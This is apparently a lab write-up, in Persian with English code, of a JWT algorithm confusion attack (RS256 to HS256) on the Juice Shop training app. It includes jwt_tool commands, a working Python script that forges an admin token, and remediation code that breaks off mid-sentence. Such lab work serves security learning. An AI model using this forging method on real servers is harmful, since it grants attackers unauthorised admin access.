JWT Token Forgery — Algorithm Confusion Attack

جعل توکن JWT از طریق Algorithm Confusion (RS256 → HS256) با استفاده از کلید عمومی سرور به‌عنوان HMAC secret — دسترسی به اطلاعات حساس سرور بدون داشتن کلید خصوصی.

Attack: Algorithm Confusion CVE Class: CWE-347 Tool: jwt_tool v2.3.0 Result: Config Disclosure
1

تئوری حمله — چرا Algorithm Confusion کار می‌کنه؟

Attack Theory — Why Algorithm Confusion Works

نحوه‌ی کار RS256 (حالت امن)

// Normal RS256 flow:

Server SIGNS token with:    PRIVATE key  (secret, never shared)
Server VERIFIES token with: PUBLIC key   (safe to share with anyone)

Token header:
{
  "alg": "RS256",
  "typ": "JWT"
}

// Result: Even if attacker has PUBLIC key, they can't forge tokens
// because signing requires the PRIVATE key

نقطه‌ی آسیب‌پذیری — Algorithm Confusion

// Vulnerable server behavior:

// Server checks: "which algorithm should I use to verify?"
// Answer comes from: the TOKEN ITSELF (attacker-controlled!)

// Attack steps:
Step 1: Get server's PUBLIC key (it's public, so it's available)
Step 2: Change header:  "alg": "RS256"  →  "alg": "HS256"
Step 3: Change payload: "role": "customer"  →  "role": "admin"
Step 4: Sign with HS256 using PUBLIC key as HMAC secret
Step 5: Vulnerable server reads "alg": "HS256" from token header
        Verifies with PUBLIC key (which it also has)
        Signature matches → Token ACCEPTED!
کلید آسیب‌پذیری: سرور به اطلاعات داخل خود توکن اعتماد می‌کنه تا بفهمه چه الگوریتمی استفاده کنه — ولی این اطلاعات توسط مهاجم قابل دستکاریه. یه سرور امن باید الگوریتم رو از config خودش بخونه، نه از توکن.

Token Forgery Attempts — Failures & Successes
FAIL #1

jwt_tool بدون تغییر payload

اولین تلاش با jwt_tool روی توکن Jim بدون تغییر role:

$ python3 jwt_tool.py $(cat ~/jim_token.txt) -X k -pk ~/jwt.pub

[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7...
    "role": "customer"   ← role unchanged, still customer

دلیل شکست: الگوریتم به HS256 تغییر کرد ولی role همون customer موند.

FAIL #2

jwt_tool با flag -I -pc role -pv admin

تلاش برای تغییر role با پرچم‌های jwt_tool:

$ python3 jwt_tool.py $(cat ~/jim_token.txt) -X k -pk ~/jwt.pub \
  -I -pc role -pv admin

// Result:
// role:admin added to ROOT of payload, not inside data{}
// Juice Shop checks data.role, not root role
// → Server still sees role=customer

دلیل شکست: Juice Shop role رو داخل data.role چک می‌کنه — jwt_tool role رو به root اضافه کرد نه داخل data.

SUCCESS ✓

Python script با forge دقیق payload

راه‌حل: نوشتن یه Python script که payload رو دقیقاً با data.role=admin می‌سازه:

import base64, hmac, hashlib, json

with open('/home/mary/jwt.pub', 'rb') as f:
    public_key = f.read()

header = {"typ": "JWT", "alg": "HS256"}

payload = {
    "data": {
        "id": 2,
        "email": "jim@juice-sh.op",
        "role": "admin",        # ← changed from customer to admin
        ...
    },
    "bid": 2,
    "iat": 1788864251
}

def b64url(data):
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',',':')).encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header_enc  = b64url(header)
payload_enc = b64url(payload)
signing_input = f"{header_enc}.{payload_enc}".encode()

sig = hmac.new(public_key, signing_input, hashlib.sha256).digest()
sig_enc = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()

print(f"{header_enc}.{payload_enc}.{sig_enc}")

راه‌حل‌های پیشنهادی

Remediation
CRITICAL 
// Fix 1 — Hardcode the expected algorithm (most important):
// Server should NEVER trust algorithm from the token itself

// Vulnerable code:
const algorithm = token.header.alg;  // ← attacker controls this!
jwt.verify(token, key, { algorithm });

// Secure code:
jwt.verify(token, publicKey, { algorithms: ['RS256'] });
// Algorithm is hardcoded — cannot be changed by attacker

// Fix 2 — Use asymmetric verification correctly:
// For RS256: always verify with PUBLIC key, sign with PRIVATE key
// Never use PUBLIC key as HMAC secret

// Fix 3 — Validate role from database, never from JWT:
// JWT should only carry user ID
// Role should always be fetched fresh from database
const user = await db.Users.findById(token.data.id);
const role = user.role;  // ← from DB, not from token

// Fix 4 — Restrict admin configuration endpoint:
// /rest/admin/application-configuration should require
